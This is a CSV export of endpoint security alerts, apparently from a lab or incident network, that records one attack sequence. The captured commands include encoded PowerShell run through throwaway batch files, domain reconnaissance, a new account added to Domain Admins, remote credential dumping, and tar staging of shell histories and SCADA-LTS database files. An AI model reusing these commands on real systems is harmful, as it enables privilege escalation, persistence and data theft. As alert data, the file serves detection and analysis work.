"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T12:00:34.158Z","10.0.3.11","High","70","An obfuscated command line attempted to launch an unusual script. Obfuscation is often used to evade detection. Review the script.","C:\Windows\system32\cmd.exe /Q /c echo powershell.exe -noni -nop -w 1 -enc IABHAGUAdAAtAEEARABUAHIAdQBzAHQAIAAtAEYAaQBsAHQAZQByACAAKgAgAHwAIABTAGUAbABlAGMAdAAgAE4AYQBtAGUALAAgAEQAaQByAGUAYwB0AGkAbwBuACwAIABUAHIAdQBzAHQAVAB5AHAAZQAsACAAVAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA ^> \\DC1\C$\lwsEJP 2^>^&1 > C:\Windows\TEMP\vgMWxa.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\vgMWxa.bat & C:\Windows\system32\cmd.exe /Q /c del C:\Windows\TEMP\vgMWxa.bat","@{filename=vgMWxa.bat; filepath=\Device\HarddiskVolume1\Windows\Temp; timestamp=1743163234}",
"2025-03-28T12:00:34.157Z","10.0.3.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo powershell.exe -noni -nop -w 1 -enc IABHAGUAdAAtAEEARABUAHIAdQBzAHQAIAAtAEYAaQBsAHQAZQByACAAKgAgAHwAIABTAGUAbABlAGMAdAAgAE4AYQBtAGUALAAgAEQAaQByAGUAYwB0AGkAbwBuACwAIABUAHIAdQBzAHQAVAB5AHAAZQAsACAAVAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA ^> \\DC1\C$\lwsEJP 2^>^&1 > C:\Windows\TEMP\vgMWxa.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\vgMWxa.bat & C:\Windows\system32\cmd.exe /Q /c del C:\Windows\TEMP\vgMWxa.bat","@{filename=vgMWxa.bat; filepath=\Device\HarddiskVolume1\Windows\Temp; timestamp=1743163234}",
"2025-03-28T12:00:14.218Z","10.0.3.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo whoami ^> \\DC1\C$\qMJfpz 2^>^&1 > C:\Windows\TEMP\xVfcQg.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\xVfcQg.bat & C:\Windows\system32\cmd.exe /Q /c del C:\Windows\TEMP\xVfcQg.bat","@{filename=xVfcQg.bat; filepath=\Device\HarddiskVolume1\Windows\Temp; timestamp=1743163214}",
"2025-03-28T11:58:45.342Z","10.0.3.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo Get-ADTrust -Filter * | Select Name, Direction, TrustType, TrustAttributes ^> \\DC1\C$\HLMsNz 2^>^&1 > C:\Windows\TEMP\dtSpXI.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\dtSpXI.bat & C:\Windows\system32\cmd.exe /Q /c del C:\Windows\TEMP\dtSpXI.bat","",
"2025-03-28T11:55:23.478Z","10.0.3.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net user jack password123 /domain ^> \\DC1\C$\QOXoIs 2^>^&1 > C:\Windows\TEMP\SskPUe.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\SskPUe.bat & C:\Windows\system32\cmd.exe /Q /c del C:\Windows\TEMP\SskPUe.bat","@{filename=SskPUe.bat; filepath=\Device\HarddiskVolume1\Windows\Temp; timestamp=1743162923}",
"2025-03-28T11:55:23.478Z","10.0.3.11","High","70","A process modified the registry in a way that may affect the security of the system. These modifications can be used by attackers to disable security controls and evade detection. Investigate the registry operations and process tree.","C:\Windows\system32\services.exe","",
"2025-03-28T11:42:18.326Z","10.0.3.11","High","70","A user created a new user account. Attackers can create new accounts to maintain their foothold on a system. Investigate the active user and newly created account.","net  group ""Domain Admins"" plumber /add /domain ","",
"2025-03-28T11:42:18.323Z","10.0.3.11","Medium","50","A process appears to be abusing Windows Management Instrumentation (WMI). Some malware exploits WMI to perform malicious activities. Investigate the process tree.","cmd.exe /Q /c net group ""Domain Admins"" plumber /add /domain 1> \Windows\Temp\YUBAqg 2>&1","",
"2025-03-28T11:41:40.126Z","10.0.3.11","High","70","A user created a new user account. Attackers can create new accounts to maintain their foothold on a system. Investigate the active user and newly created account.","C:\Windows\system32\net1  user /add plumber password /domain ","",
"2025-03-28T11:41:39.323Z","10.0.3.11","High","70","A user created a new user account. Attackers can create new accounts to maintain their foothold on a system. Investigate the active user and newly created account.","net  user /add plumber password /domain ","",
"2025-03-28T11:41:38.811Z","10.0.3.11","High","70","A process appears to be using Windows Management Instrumentation (WMI) to suspiciously execute code. Investigate the command line and process tree.","cmd.exe /Q /c net user /add plumber password /domain 1> \Windows\Temp\XeqKSm 2>&1","",
"2025-03-28T11:39:22.93Z","10.0.3.11","High","70","Attacker tooling (such as SecretsDump or crackmapexec) was observed attempting to access the registry for stored credentials. This activity is indicative of remote credential dumping. Please review associated telemetry for remote registry and/or system access.","C:\Windows\system32\svchost.exe -k localService -p -s RemoteRegistry","",
"2025-03-28T11:27:20.858Z","10.0.3.11","High","70","Attacker tooling (such as SecretsDump or crackmapexec) was observed attempting to access the registry for stored credentials. This activity is indicative of remote credential dumping. Please review associated telemetry for remote registry and/or system access.","C:\Windows\system32\svchost.exe -k localService -p -s RemoteRegistry","",
"2025-03-28T09:00:08.736Z","10.0.3.60","High","70","A process appears to be staging data. Adversaries can migrate data to a central location prior to exfiltration. Review the accessed files and process tree.","tar czf /tmp/linux_logs.tar.gz --ignore-failed-read /root/.bash_history /home/ubuntu/.bash_history /home/admin/.bash_history /var/log /var/lib/influxdb/ /var/lib/grafana/ /opt/scadalts/mysql/server/data/ /opt/scadalts/mysql/server/mysqld.log /opt/scadalts/tomcat/server/logs/","",
"2025-03-28T08:29:56.916Z","10.0.3.45","High","70","A process appears to be staging data. Adversaries can migrate data to a central location prior to exfiltration. Review the accessed files and process tree.","tar czf /tmp/linux_logs.tar.gz --ignore-failed-read /root/.bash_history /home/ubuntu/.bash_history /home/admin/.bash_history /var/log /var/lib/influxdb/ /var/lib/grafana/ /opt/scadalts/mysql/server/data/ /opt/scadalts/mysql/server/mysqld.log /opt/scadalts/tomcat/server/logs/","",
"2025-03-28T08:29:56.46Z","10.0.3.60","High","70","A process appears to be staging data. Adversaries can migrate data to a central location prior to exfiltration. Review the accessed files and process tree.","tar czf /tmp/linux_logs.tar.gz --ignore-failed-read /root/.bash_history /home/ubuntu/.bash_history /home/admin/.bash_history /var/log /var/lib/influxdb/ /var/lib/grafana/ /opt/scadalts/mysql/server/data/ /opt/scadalts/mysql/server/mysqld.log /opt/scadalts/tomcat/server/logs/","",
